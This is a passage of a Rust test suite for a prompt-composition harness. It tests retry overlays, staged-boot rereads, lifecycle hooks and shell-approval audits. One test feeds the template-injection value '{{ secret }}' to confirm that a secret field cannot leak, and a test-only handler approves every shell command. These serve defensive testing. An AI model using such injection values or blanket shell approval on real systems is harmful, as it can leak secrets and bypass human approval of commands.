    let target = fx.materialize(&mut state).expect("the target materializes");
    assert_eq!(target.prompt.trim(), "reason=authored");
}

/// The retry overlay is transient: the document's bytes are unchanged.
#[test]
fn a_retry_overlay_never_writes_to_disk() {
    let fx = retry_fixture("---\nreason: authored\n---\nreason={{ reason }}\n");
    let before = std::fs::read(&fx.fx.source_path).unwrap();
    let mut state = prompt_state(&fx.fx.source_path);
    let mut active = claudine::composition::ActiveDocumentState::initial();

    fx.dispatch(&mut state, &mut active, retry_with(&[("reason", serde_json::json!("flaky"))]));
    let read = fx.materialize(&mut state).expect("the retried read materializes");
    assert_eq!(read.prompt.trim(), "reason=flaky", "precondition: the overlay took effect");
    assert_eq!(std::fs::read(&fx.fx.source_path).unwrap(), before);
}

/// Overlay values are data on the fresh read: template text inside one is
/// never evaluated a second time.
#[test]
fn a_retry_overlay_value_is_never_evaluated_as_a_template() {
    let fx = retry_fixture("---\nsecret: leaked\nreason: authored\n---\nreason={{ reason }}\n");
    let mut state = prompt_state(&fx.fx.source_path);
    let mut active = claudine::composition::ActiveDocumentState::initial();

    fx.dispatch(
        &mut state,
        &mut active,
        retry_with(&[("reason", serde_json::json!("{{ secret }}"))]),
    );
    let read = fx.materialize(&mut state).expect("the retried read materializes");
    assert_eq!(read.prompt.trim(), "reason={{ secret }}");
    assert_eq!(effective(&read, "reason"), Some(serde_json::json!("{{ secret }}")));
}

/// The overlay is applied before the fresh read's schema validation, so it
/// cannot bypass it: an overlay value the schema rejects fails the refresh.
#[test]
fn a_retry_overlay_the_schema_rejects_fails_the_refresh() {
    let fx = retry_fixture(
        "---\n$schema:\n    topic: 'string(required)'\ntopic: authored\n---\nplan {{ topic }}\n",
    );
    let mut state = prompt_state(&fx.fx.source_path);
    let mut active = claudine::composition::ActiveDocumentState::initial();

    fx.dispatch(
        &mut state,
        &mut active,
        retry_with(&[("topic", serde_json::json!(["not", "a", "string"]))]),
    );
    let error = fx
        .materialize(&mut state)
        .expect_err("an array cannot satisfy `string(required)`");
    assert!(
        matches!(
            error.downcast_ref::<CompositionError>(),
            Some(CompositionError::SchemaValidation { problems, .. })
                if problems.iter().any(|problem| problem == "/topic")
        ),
        "{error:?}"
    );
    assert_eq!(state.pending_retry_overlay, None, "a failed read still consumes the overlay");
}

/// A retried attempt reads its document twice — the shell preflight, then the
/// canonical materialization. Both see the retry overlay; only the second
/// consumes it.
#[test]
fn the_retried_attempts_preflight_and_materialization_both_see_the_retry_overlay() {
    let fx = retry_fixture("---\nreason: authored\n---\nreason={{ reason }}\n");
    let mut state = prompt_state(&fx.fx.source_path);
    let mut active = claudine::composition::ActiveDocumentState::initial();
    fx.dispatch(&mut state, &mut active, retry_with(&[("reason", serde_json::json!("flaky"))]));

    super::super::super::preflight_harness_document(
        &mut state,
        &claudine::harness::ShellApprovalOptions::default(),
        fx.dir(),
    )
    .expect("the retried document's preflight passes");
    assert!(state.pending_retry_overlay.is_some(), "the preflight read does not consume it");

    let read = fx.materialize(&mut state).expect("the retried read materializes");
    assert_eq!(read.prompt.trim(), "reason=flaky");
}

// ── the stabilized reread's lifecycle context ─────────────────────────────

/// Which staged-boot route a [`StagedBootRun`] drives.
#[derive(Clone, Copy, Debug)]
enum BootRoute {
    /// A directly-invoked document: the command coordinator prepared the seed
    /// and the harness owes only `BootstrapStage::StabilizeOnly`.
    StabilizeOnly,
    /// A proxied target that authors `initialize`: adopted, initialized against
    /// its bootstrap read, then `BootstrapStage::TargetInitialized`, which
    /// calls `rebuild_target_launch`.
    Adopted,
}

/// What one staged boot plus the normal `start` dispatch left behind.
struct StagedBootRun {
    /// `Some(error)` when `bootstrap_adopted_document_phase` failed.
    boot_error: Option<String>,
    /// `Some(error)` when `prepare_harness_plan_phase` failed.
    plan_error: Option<String>,
    /// Whether `start_lifecycle_phase` was reached.
    start_dispatched: bool,
    /// `Some(error)` when `start_lifecycle_phase` failed.
    start_error: Option<String>,
    /// The stabilized prompt, when the boot produced one.
    prompt: Option<String>,
    epoch: Option<claudine::invocation_context::DocumentEpochWork>,
    /// What the boot handed the owning loop as its retained source.
    stabilized_source: Option<crate::commands::wrap::harness_orch::RetainedLoopSource>,
    events: Vec<Emitted>,
    log: Vec<String>,
    dir: PathBuf,
    _tmp: Option<tempfile::TempDir>,
}

impl StagedBootRun {
    fn stderr(&self, signal: LifecycleSignal) -> Vec<String> {
        self.events
            .iter()
            .filter_map(|event| match event {
                Emitted::Stderr(emitted, text) if *emitted == signal => Some(text.clone()),
                _ => None,
            })
            .collect()
    }
}

fn git(dir: &Path, args: &[&str]) {
    let output = std::process::Command::new("git")
        .args(["-c", "user.name=F", "-c", "user.email=f@e", "-c", "commit.gpgsign=false"])
        .args(args)
        .current_dir(dir)
        .output()
        .expect("git runs");
    assert!(
        output.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&output.stderr)
    );
}

/// The model the fixture names explicitly, so `env.MODEL` is the fixture's
/// own and never the host's.
const STAGED_MODEL: &str = super::super::target_launch::tests::FIXTURE_MODEL;

/// An approval handler that approves every exact command it is offered.
struct ApproveAll;

impl darkmatter::markdown::compose::shell_expansion::ShellApprovalHandler for ApproveAll {
    fn approve(
        &self,
        _request: darkmatter::markdown::compose::shell_expansion::ShellApprovalRequest,
    ) -> Result<
        darkmatter::markdown::compose::shell_expansion::ShellApprovalDecision,
        darkmatter::markdown::compose::shell_expansion::ShellExpansionError,
    > {
        Ok(darkmatter::markdown::compose::shell_expansion::ShellApprovalDecision::AllowOnce)
    }
}

/// Drive a staged boot over a committed Git repository.
///
/// `initial` is the root as first prepared (with `early.txt` already
/// untracked); before the stabilized reread the root is replaced with
/// `stabilized` and `late.txt` is created, exactly as an `initialize`-time
/// edit would. Every stage is the production phase function, in the order
/// `prepare_attempt_phase` calls them.
fn run_staged_boot(route: BootRoute, initial: &str, stabilized: &str, approve_shell: bool) -> StagedBootRun {
    let fx = fixture(serde_json::json!({}));
    let dir = fx._dir.path().to_path_buf();
    let root = match route {
        BootRoute::StabilizeOnly => fx.source_path.clone(),
        BootRoute::Adopted => {
            std::fs::write(&fx.source_path, "---\ntitle: router\n---\nrouter body\n").unwrap();
            dir.join("target.md")
        }
    };
    std::fs::write(&root, initial).unwrap();
    std::fs::write(dir.join(".gitignore"), "events.log\n").unwrap();
    git(&dir, &["init", "-q", "--initial-branch=main"]);
    git(&dir, &["add", "-A"]);
    git(&dir, &["commit", "-q", "-m", "initial"]);
    std::fs::write(dir.join("early.txt"), "early\n").unwrap();

    let _no_model = super::super::target_launch::tests::without_ambient_model();
    let intent = super::super::target_launch::tests::intent();
    let invocation =
        claudine::invocation_context::InvocationContext::capture_at(crate::request::snapshot(), &dir).unwrap();
    let mut state = prompt_state(&fx.source_path);
    state.input_layers.file_resolution_context = invocation.launch_file_resolution_context().clone();
    state.input_layers.env_overrides = std::collections::BTreeMap::from([
        ("AGENT".to_string(), "goose".to_string()),
        ("MODEL".to_string(), STAGED_MODEL.to_string()),
    ]);
    state.source_context = Some(invocation.derive_source(&fx.source_path).unwrap());
    state.invocation_context = Some(invocation);

    let (mut seed, host_context, config) = match route {
        BootRoute::StabilizeOnly => {
            let seed = super::super::super::materialize_harness_prompt(
                &mut state,
                Some(&dir),
                &dir,
                None,
                claudine::composition::SchemaStage::DeferToStabilizedReread,
            )
            .expect("the command's seed preparation succeeds");
            let context = seed.compose_context.clone();
            let config = seed.lifecycle.clone().expect("the seed carries its lifecycle");
            (Some(seed), context, config)
        }
        BootRoute::Adopted => (None, None, fx.config.clone()),
    };

    let emitter = RecordingEmitter::default();
    let ctx = LifecycleRuntimeContext {
        settings: &fx.settings,
        messaging: &fx.messaging,
        term: &fx.term,
        source_path: &fx.source_path,
        repo_root: Some(&dir),
        launch_area: None,
        context: host_context.as_ref(),
    };
    let mut guard = dispatch_guard(&config, &ctx, &emitter);
    let mut active = claudine::composition::ActiveDocumentState::initial();
    let mut coordinator = coordinator(&fx.source_path);
    match route {
        BootRoute::StabilizeOnly => coordinator.arm_stabilization(),
        BootRoute::Adopted => coordinator
            .adopt(request_with(&fx.source_path, &root, &[]), &mut state, &mut guard, &mut active)
            .expect("the target is resolvable"),
    }

    let shell_options = claudine::harness::ShellApprovalOptions {
        permissions: claudine::harness::CapturedPermissions::Absent,
        approval_handler: approve_shell.then(|| {
            std::sync::Arc::new(ApproveAll) as std::sync::Arc<dyn darkmatter::markdown::compose::shell_expansion::ShellApprovalHandler>
        }),
        ..Default::default()
    };
    let mut harness_context = crate::commands::wrap::harness_orch::CachedHarnessLoopContext::with_shell_options(
        &state.source_path.clone(),
        Some(&dir),
        shell_options,
    );
    let effect_engine = engine(&dir);
    // The fixture intent's own provider (Goose), so this test adds no
    // provider dispatch site of its own.
    let profile = crate::commands::wrap::profile::profile_for_provider(intent.fallback_provider)
        .expect("the fixture provider has a profile");

    let mut prompt = AttemptPromptPreparation {
        prompt_state: &mut state,
        harness_context: &mut harness_context,
        initial_materialized: &mut seed,
        child_cwd: &dir,
        repo_root: Some(&dir),
        effective_non_interactive: true,
        show_checks: false,
        detail_requested: false,
        silent: true,
        stream_verbosity: Verbosity::Silent,
    };
    let mut lifecycle = AttemptLifecycleExecution {
        guard: &mut guard,
        effect_engine: &effect_engine,
        term: &fx.term,
        loop_start: loop_start_now(),
    };
    let mut control = AttemptRetryProxyControl {
        active: &mut active,
        coordinator: &mut coordinator,
        provider: intent.fallback_provider,
        profile,
        cli_model: Some(STAGED_MODEL),
        launch_intent: &intent,
        handoff_ledger: None,
    };

    if matches!(route, BootRoute::Adopted) {
        let step = initialize_adopted_target_phase(&mut prompt, &mut lifecycle, &mut control)
            .expect("the target's bootstrap read and initialize succeed");
        assert!(step.is_none(), "the target's initialize clears it to stabilize");
        assert!(!control.coordinator.owes_full_bootstrap(), "mark_target_initialized ran");
    }

    // The `initialize`-time edit: a file appears after the first observation
    // and the root is rewritten.
    std::fs::write(dir.join("late.txt"), "late\n").unwrap();
    std::fs::write(&root, stabilized).unwrap();

    let attempt = control.active.iteration().attempt().number();
    preflight_fresh_document_phase(&mut prompt, &mut lifecycle, attempt, control.coordinator.bootstrap_pending())
        .expect("the fresh-document preflight passes");
    let mut document = materialize_attempt_prompt_phase(
        &mut prompt,
        &mut lifecycle,
        &control,
        claudine::composition::SchemaStage::DeferToStabilizedReread,
    )
    .expect("the pre-stabilization read succeeds");

    let mut run = StagedBootRun {
        boot_error: None,
        plan_error: None,
        start_dispatched: false,
        start_error: None,
        prompt: None,
        epoch: None,
        stabilized_source: None,
        events: Vec::new(),
        log: Vec::new(),
        dir: dir.clone(),
        _tmp: None,
    };
    match bootstrap_adopted_document_phase(&mut prompt, &mut lifecycle, &mut control, &mut document) {
        Err(error) => run.boot_error = Some(format!("{error:#}")),
        Ok(Some(_)) => run.boot_error = Some("the boot ended the run".to_string()),
        Ok(None) => {
            run.prompt = Some(document.materialized.prompt.clone());
            match prepare_harness_plan_phase(&mut prompt, &mut lifecycle, &control, &document.materialized) {
                Err(error) => run.plan_error = Some(format!("{error:#}")),
                Ok(_) => {
                    run.start_dispatched = true;
                    if let Err(error) =
                        start_lifecycle_phase(&mut prompt, &mut lifecycle, &mut control, &document.materialized)
                    {
                        run.start_error = Some(format!("{error:#}"));
                    }
                }
            }
        }
    }
    run.epoch = document.materialized.document_epoch.as_ref().map(|epoch| epoch.work_snapshot());
    run.stabilized_source = prompt.prompt_state.stabilized_source.take();
    run.events = emitter.events();
    run.log = std::fs::read_to_string(&fx.log_path)
        .unwrap_or_default()
        .lines()
        .map(str::to_string)
        .collect();
    lifecycle.guard.defuse();
    run._tmp = Some(fx._dir);
    run
}

/// The untracked-file list a rendered `files=` field shows.
fn files_field(text: &str) -> &str {
    text.split("files=").nth(1).unwrap_or("").trim()
}

const STAGED_INITIAL: &str = "---\ntitle: root\n\
initialize:\n  - append_line: [events.log, initialize]\n\
blocked:\n  - stderr: 'initial-blocked files={{ ctx.untracked_files }}'\n  - append_line: [events.log, initial-blocked]\n\
finalize:\n  - stderr: 'initial-finalize files={{ ctx.untracked_files }}'\n  - append_line: [events.log, initial-finalize]\n\
---\nfiles={{ ctx.untracked_files }}\n";

const STAGED_STABILIZED: &str = "---\ntitle: root\n\
start:\n  - stderr: 'start branch={{ ctx.branch }} model={{ env.MODEL }} files={{ ctx.untracked_files }}'\n  - append_line: [events.log, start]\n\
---\nbranch={{ ctx.branch }} model={{ env.MODEL }} files={{ ctx.untracked_files }}\n";

fn assert_stabilized_events_use_the_active_epoch(route: BootRoute) {
    let run = run_staged_boot(route, STAGED_INITIAL, STAGED_STABILIZED, false);
    assert_eq!(run.boot_error, None, "{route:?}: the stabilized boot succeeds");
    assert_eq!(run.plan_error, None, "{route:?}: the stabilized plan parses");
    assert!(run.start_dispatched, "{route:?}: start is dispatched");

    let prompt = run.prompt.as_deref().unwrap_or_default();
    let expected = format!("branch=main model={STAGED_MODEL} files=");
    assert!(prompt.contains(&expected), "{route:?}: prepared prompt {prompt:?} lacks {expected:?}");
    assert!(
        files_field(prompt).contains("early.txt") && !files_field(prompt).contains("late.txt"),
        "{route:?}: the prompt keeps the earlier file observation: {prompt:?}"
    );

    assert_eq!(run.start_error, None, "{route:?}: start renders through the stabilized context");
    let starts = run.stderr(LifecycleSignal::Start);
    assert_eq!(
        starts,
        vec![format!("start {}", prompt.trim())],
        "{route:?}: the guard-rendered start shows the prompt's branch, model, and file list"
    );
    assert_eq!(
        run.log.iter().filter(|line| *line == "start").count(),
        1,
        "{route:?}: the stabilized start fires once: {:?}",
        run.log
    );

    let epoch = run.epoch.expect("the stabilized read carries its epoch");
    assert_eq!(
        epoch.volatile_observations,
        std::collections::BTreeMap::from([("file_changes".to_string(), 1), ("git".to_string(), 1)]),
        "{route:?}: each volatile group is observed once in the epoch"
    );
    assert!(
        epoch.prepared_context_consumers.get("lifecycle").copied().unwrap_or(0) >= 1,
        "{route:?}: the stabilized epoch records its lifecycle consumer: {:?}",
        epoch.prepared_context_consumers
    );
}

/// A rewritten `start` that names a context group the original root never
/// named renders from the stabilized epoch — same branch, model, and earlier
/// file list as the prepared prompt — on the direct (`StabilizeOnly`) route.
#[test]
fn stabilized_harness_events_use_the_active_epoch() {
    assert_stabilized_events_use_the_active_epoch(BootRoute::StabilizeOnly);
}

/// The same contract on the adopted (`TargetInitialized`) route, which also
/// calls `rebuild_target_launch`.
#[test]
fn stabilized_harness_events_use_the_active_epoch_after_target_rebuild() {
    assert_stabilized_events_use_the_active_epoch(BootRoute::Adopted);
}

const STAGED_PLAN_FAILURE: &str = "---\ntitle: root\ntimeout: 1s\nstep_timeout: 2s\n\
start:\n  - append_line: [events.log, start]\n\
blocked:\n  - stderr: 'rewritten-blocked branch={{ ctx.branch }}'\n  - append_line: [events.log, rewritten-blocked]\n\
finalize:\n  - stderr: 'rewritten-finalize branch={{ ctx.branch }}'\n  - append_line: [events.log, rewritten-finalize]\n\
---\nbranch={{ ctx.branch }}\n";

fn assert_plan_failure_uses_the_rewritten_catch_and_context(route: BootRoute) {
    let run = run_staged_boot(route, STAGED_INITIAL, STAGED_PLAN_FAILURE, false);

    assert_eq!(run.boot_error, None, "{route:?}: both timeout strings pass preparation");
    assert!(!run.start_dispatched, "{route:?}: start is never dispatched");
    let plan_error = run.plan_error.as_deref().unwrap_or_default();
    assert!(
        plan_error.contains("step_timeout"),
        "{route:?}: the relation fails at plan parse: {plan_error:?}"
    );
    let initialized: &[&str] = match route {
        BootRoute::StabilizeOnly => &[],
        BootRoute::Adopted => &["initialize"],
    };
    let expected: Vec<String> = initialized
        .iter()
        .chain(&["rewritten-blocked", "rewritten-finalize"])
        .map(|line| line.to_string())
        .collect();
    assert_eq!(
        run.log, expected,
        "{route:?}: the rewritten catch runs once each, never start or the initial catch"
    );
    assert_eq!(
        run.stderr(LifecycleSignal::Blocked),
        vec!["rewritten-blocked branch=main".to_string()],
        "{route:?}"
    );
    assert_eq!(
        run.stderr(LifecycleSignal::Finalize),
        vec!["rewritten-finalize branch=main".to_string()],
        "{route:?}"
    );
}

/// A setup failure after the stabilized pair is installed — a `timeout` and
/// `step_timeout` that each parse but whose relation fails in
/// `parse_harness_plan` — runs the rewritten `blocked`/`finalize` once each
/// with the stabilized context, and never `start`.
#[test]
fn a_stabilized_plan_failure_routes_through_the_rewritten_catch_and_context() {
    assert_plan_failure_uses_the_rewritten_catch_and_context(BootRoute::StabilizeOnly);
}

/// The same failure on the adopted route, after `rebuild_target_launch`.
#[test]
fn a_stabilized_plan_failure_after_target_rebuild_routes_through_the_rewritten_catch() {
    assert_plan_failure_uses_the_rewritten_catch_and_context(BootRoute::Adopted);
}

/// A stabilized `start` naming an unapproved `shell` fails the lifecycle shell
/// audit before the new pair is installed, so `bootstrap_blocked` routes it
/// through the bootstrap (pre-reread) `blocked`/`finalize` and context.
#[test]
fn a_stabilized_shell_audit_failure_routes_through_the_bootstrap_catch_and_context() {
    let stabilized = "---\ntitle: root\n\
start:\n  - shell: echo unauthorized\n\
blocked:\n  - append_line: [events.log, rewritten-blocked]\n\
finalize:\n  - append_line: [events.log, rewritten-finalize]\n\
---\nbranch={{ ctx.branch }}\n";
    let run = run_staged_boot(BootRoute::StabilizeOnly, STAGED_INITIAL, stabilized, false);

    assert!(run.boot_error.is_some(), "the stabilized lifecycle shell audit fails");
    assert_eq!(
        run.log,
        vec!["initial-blocked".to_string(), "initial-finalize".to_string()],
        "the bootstrap lifecycle owns the failure"
    );
    for signal in [LifecycleSignal::Blocked, LifecycleSignal::Finalize] {
        let rendered = run.stderr(signal);
        assert_eq!(rendered.len(), 1, "{signal:?} renders once: {rendered:?}");
        assert!(
            files_field(&rendered[0]).contains("early.txt") && !files_field(&rendered[0]).contains("late.txt"),
            "{signal:?} renders the bootstrap file observation: {rendered:?}"
        );
    }
}

/// An approved `::shell` body directive that first appears on the stabilized
/// read runs during composition, while a shell action in an early catch
/// (before `start`) never reaches a shell runner.
#[test]
fn an_approved_stabilized_body_shell_runs_but_an_early_catch_shell_never_does() {
    let stabilized = "---\ntitle: root\ntimeout: 1s\nstep_timeout: 2s\n\
start:\n  - append_line: [events.log, start]\n\
blocked:\n  - append_line: [events.log, rewritten-blocked]\n  - shell: echo early > early-shell.txt\n\
finalize:\n  - append_line: [events.log, rewritten-finalize]\n\
---\nbody\n\n::shell echo approved-by-harness\n";
    let run = run_staged_boot(BootRoute::StabilizeOnly, STAGED_INITIAL, stabilized, true);

    assert_eq!(run.boot_error, None, "the approved stabilized read succeeds");
    assert!(
        run.prompt.as_deref().unwrap_or_default().contains("approved-by-harness"),
        "the approved body directive ran: {:?}",
        run.prompt
    );
    assert!(run.plan_error.is_some(), "the early catch is reached through the plan failure");
    assert!(
        !run.dir.join("early-shell.txt").exists(),
        "a shell action before start never reaches a shell runner"
    );
    assert!(run.log.contains(&"rewritten-blocked".to_string()), "blocked still ran: {:?}", run.log);

    let retained = run.stabilized_source.expect("the successful stabilization retains its read");
    assert_eq!(retained.source.original_text, stabilized, "the retained source is the rewritten root");
    let approved = retained.approvals.exact().cloned().collect::<Vec<_>>();
    assert_eq!(
        (approved, retained.approvals.templates().count()),
        (vec!["echo approved-by-harness".to_string()], 0),
        "the retained approval set is exactly what the stabilized read earned"
    );
}
